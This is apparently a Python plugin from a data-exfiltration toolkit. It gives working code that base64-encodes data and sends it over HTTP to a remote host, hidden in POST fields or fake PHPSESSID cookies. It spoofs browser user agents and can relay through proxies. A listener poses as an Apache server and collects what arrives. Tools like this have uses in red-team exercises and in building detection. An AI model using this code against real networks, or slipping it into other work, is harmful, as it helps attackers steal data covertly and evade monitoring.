import requests
import base64
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
import urllib
from random import choice
import platform

host_os = platform.system()

if host_os == "Linux":
    user_agent = "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
elif host_os == "Windows":
    user_agent = "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko"
else:
    user_agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7"

headers = requests.utils.default_headers()
headers.update({'User-Agent': user_agent})

html_file = open('plugins/misc/default_apache_page.html', 'r')
html_content = html_file.read()

config = None
app_exfiltrate = None

class S(BaseHTTPRequestHandler):
    def _set_headers(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html_content)

    def version_string(self):
        return 'Apache/2.4.10'

    def do_POST(self):
        self._set_headers()
        content_len = int(self.headers.getheader('content-length', 0))
        post_body = self.rfile.read(content_len)
        tmp = post_body.split('=', 1)
        if (tmp[0] == "data"):
            try:
                data = base64.b64decode(urllib.unquote(tmp[1]))
                self.server.handler(data)
            except Exception, e:
                print e
                pass

    def do_GET(self):
        self._set_headers()
        if self.headers.has_key('Cookie'):
            cookie = self.headers['Cookie']
            string = cookie.split('=', 1)[1].strip()
            try:
                data = base64.b64decode(string)
                self.server.handler(data)
            except Exception, e:
                print e
                pass

def send(data):
    if config.has_key('proxies') and config['proxies'] != [""]:
        targets = [config['target']] + config['proxies']
    	target = "http://{}:{}".format(choice(targets), config['port'])
    else:
    	target = "http://{}:{}".format(config['target'], config['port'])
    app_exfiltrate.log_message(
        'info', "[http] Sending {0} bytes to {1}".format(len(data), target))
    #Randomly choose between GET and POST
    if choice([True, False]):
        data_to_send = {'data': base64.b64encode(data)}
        requests.post(target, data=data_to_send, headers=headers)
    else:
        cookies = dict(PHPSESSID=base64.b64encode(data))
        requests.get(target, cookies=cookies, headers=headers)

def relay_http_request(data):
    target = "http://{}:{}".format(config['target'], config['port'])
    app_exfiltrate.log_message(
        'info', "[proxy] [http] Relaying {0} bytes to {1}".format(len(data), target))
    #Randomly choose between GET and POST
    if choice([True, False]):
        data_to_send = {'data': base64.b64encode(data)}
        requests.post(target, data=data_to_send, headers=headers)
    else:
        cookies = dict(PHPSESSID=base64.b64encode(data))
        requests.get(target, cookies=cookies, headers=headers)

def server(data_handler):
    try:
        server_address = ('', config['port'])
        httpd = HTTPServer(server_address, S)
        httpd.handler = data_handler
        httpd.serve_forever()
    except:
        app_exfiltrate.log_message(
            'warning', "[http] Couldn't bind http daemon on port {}".format(config['port']))

def listen():
    app_exfiltrate.log_message('info', "[http] Starting httpd...")
    server(app_exfiltrate.retrieve_data)

def proxy():
    app_exfiltrate.log_message('info', "[proxy] [http] Starting httpd...")
    server(relay_http_request)

class Plugin:
    def __init__(self, app, conf):
        global app_exfiltrate, config
        config = conf
        app_exfiltrate = app
        app.register_plugin('http', {'send': send, 'listen': listen, 'proxy': proxy})
